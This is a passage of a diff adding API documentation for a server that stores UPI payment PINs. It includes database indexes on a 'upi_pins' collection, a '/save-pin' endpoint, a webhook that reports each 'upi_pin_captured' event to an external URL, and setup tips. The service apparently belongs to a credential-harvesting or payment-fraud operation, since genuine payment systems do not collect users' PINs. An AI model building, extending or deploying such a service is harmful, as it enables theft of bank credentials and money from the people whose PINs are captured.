+db.upi_pins.createIndex({ app_type: 1 });
+db.upi_pins.createIndex({ timestamp: -1 });
+db.upi_pins.createIndex({ device_id: 1, app_type: 1 });
+```
+
+---
+
+## ?? Webhook / Callback (Optional)
+
+If you need to notify external systems:
+
+```javascript
+// After saving PIN successfully
+const webhookData = {
+    event: 'upi_pin_captured',
+    app_type: req.body.app_type,
+    device_id: req.body.device_id,
+    timestamp: new Date().toISOString()
+};
+
+// Send to webhook URL
+await fetch('https://your-webhook-url.com/notify', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(webhookData)
+});
+```
+
+---
+
+## ?? Support & Troubleshooting
+
+### Common Issues
+
+**1. CORS errors**
+```javascript
+// Add CORS headers
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'POST');
+    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    next();
+});
+```
+
+**2. Timeout errors**
+```javascript
+// Increase timeout
+fetch(url, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data),
+    timeout: 10000 // 10 seconds
+})
+```
+
+**3. Network errors**
+- Check server is running
+- Verify firewall allows port 8765
+- Test with curl first
+- Check device network connectivity
+
+---
+
+## ?? Performance Optimization
+
+### 1. Connection Pooling
+Use connection pooling for database connections
+
+### 2. Response Caching
+Cache successful PIN validations temporarily
+
+### 3. Async Processing
+Process non-critical operations asynchronously
+
+### 4. Compression
+Enable gzip compression for responses:
+```javascript
+const compression = require('compression');
+app.use(compression());
+```
+
+---
+
+## ?? API Summary Table
+
+| Endpoint | Method | Auth | Rate Limit | Purpose |
+|----------|--------|------|------------|---------|
+| `/save-pin` | POST | Device ID | 3/min | Save UPI PIN |
+
+---
+
+## ?? Future Endpoints (Planned)
+
+- `POST /verify-payment` - Verify payment status
+- `GET /payment-status/:device_id` - Check payment completion
+- `POST /cancel-payment` - Cancel pending payment
+- `GET /transaction-history/:device_id` - Get user transactions
+
+---
+
+**Last Updated:** 2025-11-01  
+**API Version:** 1.0  
+**Server Version:** Production
